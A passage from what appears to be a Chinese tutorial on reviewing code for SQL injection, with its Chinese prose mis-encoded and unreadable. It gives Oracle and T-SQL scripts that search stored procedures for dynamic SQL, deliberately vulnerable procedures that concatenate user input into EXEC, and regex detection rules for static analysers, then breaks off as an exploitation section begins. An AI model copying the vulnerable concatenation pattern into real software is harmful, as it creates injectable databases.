keyword">text</span> <span class="token keyword">AS</span> Source <span class="token keyword">FROM</span> dba_source <span class="token keyword">where</span> lower<span class="token punctuation">(</span>Source<span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%:=%||%''%'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/07/19/WJRN2q.png" alt="WJRN2q.png"></p><p>ä¸Šè¿°SQLè¯­å¥æ‰¾åˆ°äº†ä¸€ä¸ªåˆ©ç”¨ç”¨æˆ·æ§åˆ¶çš„æ•°æ®åŠ¨æ€åˆ›å»ºSQLè¯­å¥çš„åŒ…ã€‚æˆ‘ä»¬æœ‰å¿…è¦å¯¹è¯¥åŒ…åšè¿›ä¸€æ­¥å®¡æŸ¥ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹åˆ—SQLè¯­å¥è¿½æº¯åŒ…(package)çš„æºä»¥ä¾¿è¿›ä¸€æ­¥å®¡æŸ¥å…¶å†…å®¹</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">text</span> <span class="token keyword">AS</span> Source <span class="token keyword">FROM</span> dba_source <span class="token keyword">WHERE</span> name<span class="token operator">=</span><span class="token string">'SP_STORED_PROCEDURE'</span> <span class="token operator">AND</span> owner<span class="token operator">=</span><span class="token string">'SYSMAN'</span> <span class="token keyword">order</span> <span class="token keyword">by</span> line<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/07/19/WJR0qU.png" alt="WJR0qU.png"></p><p>inputç›´æ¥ä¸SQLå­—ç¬¦ä¸²ç›¸è¿ï¼Œå¯ä»¥åˆ¤æ–­å­˜åœ¨SQLæ³¨å…¥</p><p>æœç´¢æ•°æ®åº“ä¸­æ‰€æœ‰çš„ä»£ç </p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- Purpose: A PL/SQL script to search the DB for potentially vulnerable </span><span class="token comment">-- PL/SQL code</span>â€”<span class="token operator">-</span> Version: v <span class="token number">0.0</span><span class="token number">.1</span><span class="token comment">-- Works against: Oracle 9i, 10g and llg</span>â€”â€”Author: Alexander Kornbrust <span class="token keyword">of</span> Red<span class="token operator">-</span><span class="token keyword">Database</span><span class="token operator">-</span>Security GmbH<span class="token keyword">select</span> <span class="token keyword">distinct</span> a<span class="token punctuation">.</span>owner<span class="token punctuation">,</span>aâ€¢name<span class="token punctuation">,</span>b<span class="token punctuation">.</span>authid<span class="token punctuation">,</span>a<span class="token punctuation">.</span><span class="token keyword">text</span> SQLTEXT <span class="token keyword">from</span> all_source a<span class="token punctuation">,</span>all_procedures b<span class="token keyword">where</span> <span class="token punctuation">(</span>lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%execute%immediate%(%||%)%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_sql%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%grant%to%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%alter%user%identified%by%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%execute%immediate%''%||%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_%utility.exec_ddl_statement%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_ddl.create_wrapped%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_hs_pass_through.execute_immediate%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_hs_passthrough.parse%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%owa_util.bind_variables%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%owa_util.listprint%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%owa_ util.tableprint%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_sys_sq1.%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%ltadm.execsql%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_prvtaqim.execute_stmt%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_streams_rpc.execute_stmt%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_aqadm_sys.execute_stmt%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_streams_adm_utl.execute_ sql_ string%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%initjvmaux.exec%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_repcat_sql_utl.do_sql%'</span><span class="token operator">or</span> lower<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'%dbms_aqadm_syscalls.kwqa3_gl_executestmt%'</span><span class="token operator">and</span> lower<span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token operator">not</span> <span class="token operator">like</span> <span class="token string">'% wrapped%'</span> <span class="token operator">and</span> a<span class="token punctuation">.</span>owner<span class="token operator">=</span>b<span class="token punctuation">.</span>owner <span class="token operator">and</span> a<span class="token punctuation">.</span>name<span class="token operator">=</span>b<span class="token punctuation">.</span>obj ect_name <span class="token operator">and</span> a<span class="token punctuation">.</span>owner <span class="token operator">not</span> <span class="token operator">in</span><span class="token punctuation">(</span><span class="token string">'OLAPSYS'</span><span class="token punctuation">,</span> <span class="token string">'ORACLE_OCM'</span><span class="token punctuation">,</span> <span class="token string">'CTXSYS'</span><span class="token punctuation">,</span> <span class="token string">'OUTLN'</span><span class="token punctuation">,</span> <span class="token string">'SYSTEM'</span><span class="token punctuation">,</span> <span class="token string">'EXFSYS'</span><span class="token punctuation">,</span> <span class="token string">'MDSYS'</span><span class="token punctuation">,</span><span class="token string">'SYS'</span><span class="token punctuation">,</span><span class="token string">'SYSMAN'</span><span class="token punctuation">,</span><span class="token string">'WKSYS'</span><span class="token punctuation">,</span><span class="token string">'XDB'</span><span class="token punctuation">,</span><span class="token string">'FLOWS_040000'</span><span class="token punctuation">,</span><span class="token string">'FLOWS_030000'</span><span class="token punctuation">,</span> <span class="token string">'FLOWS_030100'</span><span class="token punctuation">,</span><span class="token string">'FLOWS_020000'</span><span class="token punctuation">,</span><span class="token string">'FLOWS_020100'</span><span class="token punctuation">,</span><span class="token string">'FLOWS020000'</span><span class="token punctuation">,</span><span class="token string">'FLOWS_010600'</span><span class="token punctuation">,</span><span class="token string">'FLOWS_010500'</span><span class="token punctuation">,</span><span class="token string">'FLOWS_010400'</span><span class="token punctuation">)</span><span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="T-SQL"><a href="#T-SQL" class="headerlink" title="T-SQL"></a>T-SQL</h5><p>sp_helptextå­˜å‚¨è¿‡ç¨‹ä¼šæ˜¾ç¤ºç”¨äºåœ¨å¤šè¡Œä¸­åˆ›å»ºå¯¹è±¡çš„å®šä¹‰ã€‚æ¯ä¸€è¡Œå‡åŒ…å«äº† T-SQL å®šä¹‰çš„255ä¸ªå­—ç¬¦ã€‚è¯¥å®šä¹‰ä½äºsys.sql_modulesç›®å½•è§†å›¾çš„definitionåˆ—ä¸­ã€‚</p><p>ä¸€ä¸ªå‚¨å­˜è¿‡ç¨‹æºä»£ç </p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_helptext SP_StoredProcedure<span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> SP_StoredProcedure <span class="token variable">@input</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token boolean">NULL</span> <span class="token keyword">AS</span> <span class="token keyword">DECLARE</span> <span class="token variable">@sql</span> nvarchar<span class="token punctuation">(</span><span class="token number">4000</span><span class="token punctuation">)</span><span class="token keyword">SELECT</span> <span class="token variable">@sql</span> <span class="token operator">=</span> <span class="token string">'SELECT field FROM table WHERE field ='''</span><span class="token operator">+</span> <span class="token variable">@input</span> <span class="token operator">+</span> <span class="token string">''''</span> <span class="token keyword">EXEC</span> <span class="token punctuation">(</span><span class="token variable">@sql</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°@inputå˜é‡æ¥è‡ªç”¨æˆ·ç›´æ¥è¾“å…¥ä¸SQLå­—ç¬¦ä¸²ç›¸è¿ï¼Œäº§ç”ŸSQLæ³¨å…¥</p><p>ä½¿ç”¨sp_executesqlå’ŒEXEC()ä¸¤æ¡å‘½ä»¤æ¥è°ƒç”¨åŠ¨æ€SQLï¼Œsp_executesqlæ˜¯ä¸€ä¸ªå†…ç½®å­˜å‚¨è¿‡ç¨‹ï¼Œæ¥æ”¶ä¸¤ä¸ªé¢„å®šä¹‰çš„å‚æ•°å’Œä»»æ„å¤šä¸ªç”¨æˆ·å®šä¹‰å‚æ•°ã€‚ç¬¬ä¸€ä¸ªå‚æ•°@stmtæ˜¯å¼ºåˆ¶å‚æ•°ï¼ŒåŒ…å«ä¸€æ¡æˆ–ä¸€æ‰¹ SQLè¯­å¥ã€‚åœ¨SQL 7å’ŒSQL 2000ä¸­ï¼Œ@stmtçš„æ•°æ®ç±»å‹æ˜¯ntext,åœ¨SQL Server 2005åŠä¹‹å çš„ç‰ˆæœ¬ä¸­æ˜¯nvarchar(MAX)ã€‚ç¬¬äºŒä¸ªå‚æ•°@paramsæ˜¯å¯é€‰å‚æ•°ã€‚EXEC()æ¥æ”¶ä¸€ä¸ªå‚æ•°ï¼Œè¯¥å‚æ•°æ˜¯ä¸€æ¡è¦æ‰§è¡Œçš„SQLè¯­å¥ã€‚å®ƒå¯ä»¥ç”±å­—ç¬¦ä¸²å˜é‡å’Œå­—ç¬¦ä¸²å¸¸é‡è¿æ¥è€Œæˆã€‚</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨äº† sp_executesqlå­˜å‚¨è¿‡ç¨‹ä¸”æ˜“å—åˆ°æ”»å‡»çš„å­˜å‚¨è¿‡ç¨‹ç¤ºä¾‹</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_helptext SP_StoredProcedure_II<span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> SP_StoredProcedure_II <span class="token punctuation">(</span><span class="token variable">@input</span> nvarchar<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">AS</span><span class="token keyword">DECLARE</span> <span class="token variable">@sql</span> nvarchar<span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token keyword">SET</span> <span class="token variable">@sql</span> <span class="token operator">=</span> <span class="token string">'SELECT field FROM table WHERE field ='''</span><span class="token operator">+</span> <span class="token variable">@input</span> <span class="token operator">+</span><span class="token string">''''</span> <span class="token keyword">EXEC</span> sp_executesql <span class="token variable">@sql</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ—å‡ºæ‰€æœ‰å‚¨å­˜è¿‡ç¨‹</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> name <span class="token keyword">FROM</span> dbo<span class="token punctuation">.</span>sysobjects <span class="token keyword">WHERE</span> <span class="token keyword">type</span> <span class="token operator">=</span><span class="token string">'P'</span> <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> name <span class="token keyword">asc</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åˆ©ç”¨è„šæœ¬æ‰¾åˆ°æ‰€æœ‰å‚¨å­˜è¿‡ç¨‹</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- Description: A T-SQL script to search the DB for potentially vulnerable </span><span class="token comment">-- T-SQL code</span><span class="token comment">-- @text - search string '%text%'</span><span class="token comment">-- @dbname - database name, by default all databases will be searched</span><span class="token keyword">ALTER</span> <span class="token keyword">PROCEDURE</span> <span class="token punctuation">[</span>dbo<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span>grep_sp<span class="token punctuation">]</span><span class="token variable">@text</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">250</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">@dbname</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token boolean">null</span><span class="token keyword">AS</span> <span class="token keyword">BEGIN</span><span class="token keyword">SET</span> NOCOUNT <span class="token keyword">ON</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token variable">@dbname</span> <span class="token operator">is</span> <span class="token boolean">null</span><span class="token keyword">begin</span><span class="token comment">-- enumerate all databases.</span><span class="token keyword">DECLARE</span> <span class="token comment">#db CURSOR FOR Select Name from master...sysdatabases declare 0c_dbname varchar(64)</span><span class="token keyword">OPEN</span> <span class="token comment">#db FETCH #db INTO @c_dbname</span><span class="token keyword">while</span> @<span class="token variable">@FETCH_STATUS</span> <span class="token operator">&lt;&gt;</span> <span class="token operator">-</span><span class="token number">1</span><span class="token keyword">begin</span><span class="token keyword">execute</span> grep_sp <span class="token variable">@text</span><span class="token punctuation">,</span> <span class="token variable">@c_dbname</span><span class="token keyword">FETCH</span> <span class="token comment">#db INTO @c_dbname</span><span class="token keyword">end</span><span class="token keyword">CLOSE</span> <span class="token comment">#db DEALLOCATE #db</span><span class="token keyword">end</span><span class="token keyword">else</span><span class="token keyword">begin</span><span class="token keyword">declare</span> <span class="token variable">@sql</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">250</span><span class="token punctuation">)</span><span class="token comment">-- create the find like command</span><span class="token keyword">select</span> <span class="token variable">@sql</span> <span class="token operator">=</span> <span class="token string">'select '''</span> <span class="token operator">+</span> <span class="token variable">@dbname</span> <span class="token operator">+</span> <span class="token string">''' as db, o.name,m.definition'</span><span class="token keyword">select</span> <span class="token variable">@sql</span> <span class="token operator">=</span> <span class="token variable">@sql</span> <span class="token operator">+</span> <span class="token string">'from '</span><span class="token operator">+</span><span class="token variable">@dbname</span><span class="token operator">+</span><span class="token string">'.sys.sql_modules m '</span> <span class="token keyword">select</span> <span class="token variable">@sql</span> <span class="token operator">=</span> <span class="token variable">@sql</span> <span class="token operator">+</span> <span class="token string">'inner join '</span><span class="token operator">+</span><span class="token variable">@dbname</span><span class="token operator">+</span><span class="token string">'...sysobjects o onm.object_id=o.id'</span><span class="token keyword">select</span> <span class="token variable">@sql</span> <span class="token operator">=</span> <span class="token variable">@sql</span> <span class="token operator">+</span> <span class="token string">'where [definition] like ''%'</span><span class="token operator">+</span><span class="token variable">@text</span><span class="token operator">+</span><span class="token string">'%'''</span> <span class="token keyword">execute</span> <span class="token punctuation">(</span><span class="token variable">@sql</span><span class="token punctuation">)</span><span class="token keyword">end</span><span class="token keyword">END</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è°ƒç”¨å‚¨å­˜è¿‡ç¨‹</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">execute</span> grep_sp <span class="token string">'sp_executesql'</span><span class="token punctuation">;</span><span class="token keyword">execute</span> grep_sp <span class="token string">'EXEC'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>åˆ—å‡ºSQL Server 2008æ•°æ®åº“ä¸­æ‰€æœ‰çš„å­˜å‚¨è¿‡ç¨‹</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> name <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span>procedures <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> name <span class="token keyword">asc</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è„šæœ¬</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DECLARE</span> <span class="token variable">@name</span> <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token comment">-- database name</span><span class="token keyword">DECLARE</span> db_cursor <span class="token keyword">CURSOR</span> <span class="token keyword">FOR</span><span class="token keyword">SELECT</span> name <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span>procedures<span class="token punctuation">;</span><span class="token keyword">OPEN</span> db_cursor<span class="token keyword">FETCH</span> <span class="token keyword">NEXT</span> <span class="token keyword">FROM</span> db_cursor <span class="token keyword">INTO</span> <span class="token variable">@name</span><span class="token keyword">WHILE</span> @<span class="token variable">@FETCH_STATUS</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">BEGIN</span><span class="token keyword">print</span> <span class="token variable">@name</span><span class="token comment">-- uncomment the line below to print the source</span><span class="token comment">-- sp_helptext '' + @name + ''</span><span class="token keyword">FETCH</span> <span class="token keyword">NEXT</span> <span class="token keyword">FROM</span> db_cursor <span class="token keyword">INTO</span> <span class="token variable">@name</span><span class="token keyword">END</span><span class="token keyword">CLOSE</span> db_cursor<span class="token keyword">DEALLOCATE</span> db_cursor<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>mysqlè·å–å‚¨å­˜è¿‡ç¨‹</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> <span class="token keyword">procedure</span> <span class="token keyword">status</span><span class="token punctuation">;</span><span class="token comment">#åˆ—å‡ºä¸€ç³»åˆ—å‚¨å­˜è¿‡ç¨‹</span><span class="token keyword">show</span> <span class="token keyword">create</span> <span class="token keyword">procedure</span> sp_name<span class="token punctuation">;</span><span class="token comment">#åˆ—å‡ºsp_nameçš„æºä»£ç </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="è‡ªåŠ¨å¤æŸ¥æºä»£ç "><a href="#è‡ªåŠ¨å¤æŸ¥æºä»£ç " class="headerlink" title="è‡ªåŠ¨å¤æŸ¥æºä»£ç "></a>è‡ªåŠ¨å¤æŸ¥æºä»£ç </h3><h4 id="Graudit"><a href="#Graudit" class="headerlink" title="Graudit"></a>Graudit</h4><p>ä¸‹è½½ï¼š <a href="http://www.justanotherhacker.com/projects/graudit/">graudit (justanotherhacker.com)</a></p><p>è§„åˆ™</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">pg_query\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span>pg_exec\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span>pg_send_query\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span>pg_send_query_params\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span>pg_query_params\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span>pg_send_prepare\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span>pg_prepare\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span>pg_execute\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span>pg_insert\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span>pg_put_line\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span>pg_select\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span>pg_update\s<span class="token operator">*</span>\<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>\$<span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="YASCA"><a href="#YASCA" class="headerlink" title="YASCA"></a>YASCA</h4><h4 id="Pixy"><a href="#Pixy" class="headerlink" title="Pixy"></a>Pixy</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql_db_query <span class="token keyword">SQL</span> injection configuration <span class="token keyword">file</span> <span class="token keyword">for</span> <span class="token keyword">user</span><span class="token operator">-</span>defined sink sinkType <span class="token operator">=</span> <span class="token keyword">sql</span>mysql_db_query <span class="token operator">=</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="AppCodeScan"><a href="#AppCodeScan" class="headerlink" title="AppCodeScan"></a>AppCodeScan</h4><p>.NET</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#Scanning for SQL injections</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">.</span>SqlCommand<span class="token punctuation">.</span><span class="token operator">*</span>?<span class="token operator">|</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">.</span>DbCommand<span class="token punctuation">.</span><span class="token operator">*</span>?<span class="token operator">|</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">.</span>OleDbCommand<span class="token punctuation">.</span><span class="token operator">*</span>?<span class="token operator">|</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">.</span>SqlUtility<span class="token punctuation">.</span><span class="token operator">*</span>?<span class="token operator">|</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">.</span>OdbcCommand<span class="token punctuation">.</span><span class="token operator">*</span>?<span class="token operator">|</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">.</span>OleDbDataAdapter<span class="token punctuation">.</span><span class="token operator">*</span>?<span class="token operator">|</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">.</span>SqlDataSource<span class="token punctuation">.</span><span class="token operator">*</span>?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="OWASP-LAPSE-é¡¹ç›®"><a href="#OWASP-LAPSE-é¡¹ç›®" class="headerlink" title="OWASP LAPSE+é¡¹ç›®"></a>OWASP LAPSE+é¡¹ç›®</h4><h4 id="Microsoft-SQLæ³¨å…¥æºä»£ç åˆ†æå™¨"><a href="#Microsoft-SQLæ³¨å…¥æºä»£ç åˆ†æå™¨" class="headerlink" title="Microsoft SQLæ³¨å…¥æºä»£ç åˆ†æå™¨"></a>Microsoft SQLæ³¨å…¥æºä»£ç åˆ†æå™¨</h4><h4 id="CAT-NET"><a href="#CAT-NET" class="headerlink" title="CAT.NET"></a>CAT.NET</h4><h4 id="RIPSâ€”â€”PHPè„šæœ¬æ¼æ´çš„é™æ€æºä»£ç åˆ†æå™¨"><a href="#RIPSâ€”â€”PHPè„šæœ¬æ¼æ´çš„é™æ€æºä»£ç åˆ†æå™¨" class="headerlink" title="RIPSâ€”â€”PHPè„šæœ¬æ¼æ´çš„é™æ€æºä»£ç åˆ†æå™¨"></a>RIPSâ€”â€”PHPè„šæœ¬æ¼æ´çš„é™æ€æºä»£ç åˆ†æå™¨</h4><h4 id="CodePro-AnalytiX"><a href="#CodePro-AnalytiX" class="headerlink" title="CodePro AnalytiX"></a>CodePro AnalytiX</h4><h4 id="Teachable-Static-Analysis-Workbench"><a href="#Teachable-Static-Analysis-Workbench" class="headerlink" title="Teachable Static Analysis Workbench"></a>Teachable Static Analysis Workbench</h4><h4 id="å•†ä¸šæºä»£ç å¤æŸ¥å·¥å…·"><a href="#å•†ä¸šæºä»£ç å¤æŸ¥å·¥å…·" class="headerlink" title="å•†ä¸šæºä»£ç å¤æŸ¥å·¥å…·"></a>å•†ä¸šæºä»£ç å¤æŸ¥å·¥å…·</h4><h4 id="Fortifyæºä»£ç åˆ†æå™¨"><a href="#Fortifyæºä»£ç åˆ†æå™¨" class="headerlink" title="Fortifyæºä»£ç åˆ†æå™¨"></a>Fortifyæºä»£ç åˆ†æå™¨</h4><h4 id="Rational-AppScan-Source-Edition"><a href="#Rational-AppScan-Source-Edition" class="headerlink" title="Rational AppScan Source Edition"></a>Rational AppScan Source Edition</h4><h4 id="CodeSecure"><a href="#CodeSecure" class="headerlink" title="CodeSecure"></a>CodeSecure</h4><h4 id="Klocwork-Solo"><a href="#Klocwork-Solo" class="headerlink" title="Klocwork Solo"></a>Klocwork Solo</h4><h2 id="åˆ©ç”¨SQLæ³¨å…¥"><a href="#åˆ©ç”¨SQLæ³¨å…¥" class="headerlink" title="åˆ©ç”¨SQLæ³¨å…¥"></a>åˆ©ç”¨SQLæ³¨å…¥</h2><h3 id="å¸¸è§çš„æ¼æ´åˆ©ç”¨æŠ€æœ¯"><a href="#å¸¸è§çš„æ¼æ´åˆ©ç”¨æŠ€æœ¯" class="headerlink" title="å¸¸è§çš„æ¼æ´åˆ©ç”¨æŠ€æœ¯"></a>å¸¸è§çš„æ¼æ´åˆ©ç”¨æŠ€æœ¯</h3><p>æœ¬ç« å¤§å¤šç”¨è¿™ä¸ªç¤ºä¾‹</p><p><a href="http://sql/Less-2/?id=1">http://sql/Less-2/?id=1</a></p><p><img src="https://z3.ax1x.com/2021/07/19/WJRcGR.png" alt="WJRcGR.png"></p><h4 id="ä½¿ç”¨å †å æ³¨å…¥"><a href="#ä½¿ç”¨å †å æ³¨å…¥" class="headerlink" title="ä½¿ç”¨å †å æ³¨å…¥"></a>ä½¿ç”¨å †å æ³¨å…¥</h4><p>å †å æŸ¥è¯¢ï¼ˆstacked queryï¼‰æŒ‡çš„æ˜¯åœ¨å•ä¸ªæ•°æ®åº“è¿æ¥ä¸­æ‰§è¡Œå¤šä¸ªæŸ¥è¯¢åºåˆ—ï¼Œä½¿ç”¨ä¸åŒçš„æ•°æ®åº“å’Œä¸åŒçš„webæ¡†æ¶ï¼Œå¯¹å †å æŸ¥è¯¢æ”¯æŒæƒ…å†µä¹Ÿä¸åŒï¼Œä½¿ç”¨ASP.NETå’ŒPHPè®¿é—®Microsoft SQL Serveræ—¶å…è®¸å †å 